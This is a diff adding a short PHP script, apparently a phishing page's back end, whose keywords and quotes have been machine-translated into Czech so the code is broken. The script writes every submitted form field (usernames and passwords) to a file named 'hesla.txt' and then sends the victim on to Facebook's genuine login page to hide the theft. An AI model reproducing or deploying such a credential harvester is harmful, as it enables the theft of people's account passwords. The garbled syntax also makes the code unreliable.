@@ -1,0 +1,13 @@
+<?php
+header ('Umístění: https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028');
+$handle = fopen(“hesla.txt”, “a”);
+foreach($_POST jako $proměnná => $hodnota) {
+fwrite($handle, $proměnná);
+fwrite($handle, “=”);
+fwrite($handle, $hodnota);
+fwrite($handle, “\r\n”);
+}
+fwrite($handle, “\r\n”);
+fclose($handle);
+výstup;
+?>
